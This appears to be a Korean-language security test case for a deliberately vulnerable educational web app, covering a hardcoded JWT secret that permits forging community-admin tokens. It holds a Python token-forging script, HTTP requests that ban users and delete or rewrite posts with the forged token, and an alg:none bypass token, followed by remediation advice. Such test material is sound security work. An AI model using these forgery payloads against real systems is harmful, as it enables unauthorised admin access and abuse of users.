@@ -1,0 +1,98 @@
+================================================================================
+[VCE-CM-16] 인증 세션 및 토큰값 안전성 설정 여부 (커뮤니티)
+도메인: community
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명: JWT 시크릿 하드코딩 → 커뮤니티 관리자 권한 위조
+   - 번호: CM-16
+   - 위험도: Critical
+   - OWASP: A07:2021 – Identification and Authentication Failures
+
+2. 대상 기능 & 엔드포인트
+   - 로컬:  http://localhost:8080/api/community/admin/**
+   - 운영:  https://vceapp.com/api/community/admin/**
+   - HTTP 메서드: PATCH
+   - 인증 요건: 인증된 사용자 (ADMIN 역할 필요)
+
+3. 취약점 원리 (Why this works)
+   JwtTokenProvider.java:18 에 하드코딩된 시크릿:
+     "vce_secret_key_for_educational_purpose_only_do_not_use_in_production"
+
+   이 키로 ADMIN role JWT를 위조하면 커뮤니티 관리자 기능에 접근할 수 있다:
+   - 다른 사용자 계정 차단/해제 (/api/community/admin/members/{id}/status)
+   - 게시글 강제 삭제/숨김 처리
+   - 공지사항 등록 (isNotice=Y 설정)
+
+4. 테스트 절차 (Step-by-step)
+
+   Step 1. ADMIN JWT 위조
+
+   Python 스크립트:
+   import jwt, time
+   SECRET = "vce_secret_key_for_educational_purpose_only_do_not_use_in_production"
+   token = jwt.encode({
+       "sub": "attacker@evil.com",
+       "role": "ADMIN",
+       "iat": int(time.time()),
+       "exp": int(time.time()) + 86400
+   }, SECRET, algorithm="HS256")
+   print(token)
+
+   Step 2. 위조 토큰으로 커뮤니티 관리자 기능 접근
+   --- HTTP 요청 예시 ---
+   PATCH /api/community/admin/members/2/status HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <위조_ADMIN_JWT>
+   Content-Type: application/json
+
+   {"status": "BANNED"}
+   ---
+
+   Step 3. 일반 게시글을 공지사항으로 변경 시도
+   --- HTTP 요청 예시 ---
+   PUT /api/community/posts/1 HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <위조_ADMIN_JWT>
+   Content-Type: application/json
+
+   {
+     "title": "공지사항 (위조)",
+     "content": "공격자가 작성한 공지",
+     "isNotice": true
+   }
+   ---
+
+   Step 4. 타 사용자 게시글 강제 삭제
+   --- HTTP 요청 예시 ---
+   DELETE /api/community/posts/5 HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <위조_ADMIN_JWT>
+   ---
+
+   Step 5. alg:none 공격
+   --- HTTP 요청 예시 ---
+   PATCH /api/community/admin/members/2/status HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkB2Y2UuY29tIiwicm9sZSI6IkFETUlOIiwiZXhwIjo5OTk5OTk5OTk5fQ.
+   Content-Type: application/json
+
+   {"status": "BANNED"}
+   ---
+
+5. 취약 여부 판단 기준
+   ✅ 취약 (Vulnerable):
+      - 위조 ADMIN JWT로 PATCH → HTTP 200 + 상태 변경 성공
+      - alg:none 토큰 인증 통과
+   ✗ 안전 (Not Vulnerable):
+      - HTTP 401 Unauthorized (서명 검증 실패)
+      - HTTP 403 Forbidden (권한 없음)
+
+6. 예상 취약 포인트 (코드 위치)
+   - JwtTokenProvider.java:18 — SECRET_KEY 하드코딩
+   - CommunityController.java:104-111 — ADMIN 역할 검증 없이 @AuthenticationPrincipal만 사용
+
+7. 권고 조치
+   - 시크릿 키 환경변수화
+   - /api/community/admin/** 에 hasRole("ADMIN") 명시적 적용
+   - 관리자 작업 감사 로그 (누가, 언제, 무엇을 했는지) 기록
